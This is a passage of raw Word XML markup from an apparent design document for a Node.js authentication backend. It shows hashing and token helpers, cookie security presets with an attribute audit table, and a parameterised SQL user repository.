                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">IMPORTANT  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why regex AND length()</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Anchored regex already enforces length-7, but the explicit .length(7) gives precise error messages and protects against accidental schema relaxation.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Catching malformed input here saves bcrypt CPU. bcrypt.compare is intentionally ~80ms; pre-rejecting 'abc' in &lt;1ms means an attacker firing random strings hits 422 instantly, not 80ms × N of CPU drain.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.3  utils/crypto.js — Hash &amp; Random Helpers</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src/utils/crypto.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const crypto = require('node:crypto');</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function sha256(input) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return crypto.createHash('sha256').update(input, 'utf8').digest('hex');</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function randomToken(bytes = 32) {   // 32 bytes → 64-char hex</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return crypto.randomBytes(bytes).toString('hex');</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module.exports = { sha256, randomToken };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="4F5DFF"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">INFO  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why SHA-256 (not bcrypt) for refresh tokens</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Refresh tokens are HIGH-ENTROPY JWTs signed by a 256-bit secret — uncrackable by brute force.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The lookup path needs to be FAST and DETERMINISTIC (same input → same hash → UNIQUE INDEX on token_hash).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>bcrypt's slowness is meaningful for passwords (low entropy); for refresh tokens it would be 80ms per refresh for zero security gain.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.4  utils/cookies.js — Cookie Names + Option Presets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Two cookies, two option presets. Centralised so every cookie set / clear uses identical attributes — a security-critical guarantee.</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src/utils/cookies.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const REFRESH_COOKIE_NAME = 'cmcmis_rt';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const CSRF_COOKIE_NAME    = 'cmcmis_csrf';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;</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function refreshCookieOpts(env) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    httpOnly: true,                                   // JS CANNOT read this</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    secure:   env.NODE_ENV === 'production',          // HTTPS-only in prod</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    sameSite: 'lax',                                  // CSRF defence</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    path:     '/api/v1/auth',                         // narrow scope</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    maxAge:   SEVEN_DAYS_MS,</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function csrfCookieOpts(env) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    httpOnly: false,                                  // FE must read it</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    secure:   env.NODE_ENV === 'production',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    sameSite: 'lax',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    path:     '/',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    maxAge:   SEVEN_DAYS_MS,</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module.exports = { REFRESH_COOKIE_NAME, CSRF_COOKIE_NAME, refreshCookieOpts, csrfCookieOpts };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Cookie attribute audit</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
        <w:gridCol w:w="2550"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>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Attribute</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2098"/>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cmcmis_rt (refresh)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>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cmcmis_csrf (double-submit)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>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Defends against</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>httpOnly</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2098"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>TRUE</w:t>
            </w:r>
          </w:p>
        </w:tc>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FALSE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>XSS theft (refresh) / required for FE to read (CSRF)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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secure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="209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prod</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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prod</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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Network interception in production</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>sameSite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2098"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>lax</w:t>
            </w:r>
          </w:p>
        </w:tc>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lax</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Cross-site CSRF baseline</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="170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path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="209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/api/v1/auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="226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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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Cookie scope (refresh narrow; CSRF wide for interceptor read)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>maxAge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2098"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>7 days</w:t>
            </w:r>
          </w:p>
        </w:tc>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7 days</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Matches refresh JWT TTL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.5  The Three Repositories — Where SQL Lives</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Repositories are the ONLY files in the codebase that contain SQL strings. Services and controllers compose them; they never write raw queries. This contract is what lets us audit SQL-injection risk in one place.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.5.1  users.repo.js</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src/modules/auth/users.repo.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const pool = require('../../config/db');</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async function findByEmployeeId(employeeId) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [rows] = await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `SELECT user_id, employee_id, password_hash, section_id,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            is_active, is_locked, failed_login_count, last_login_at</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       FROM users</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE employee_id = ?</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      LIMIT 1`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [employeeId],</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return rows[0] || null;</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async function loadRoleAndPermissions(userId) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  // Single JOIN — role_code + every permission_code in one round trip</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [rows] = await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `SELECT r.role_code, p.permission_code</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       FROM user_roles ur</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
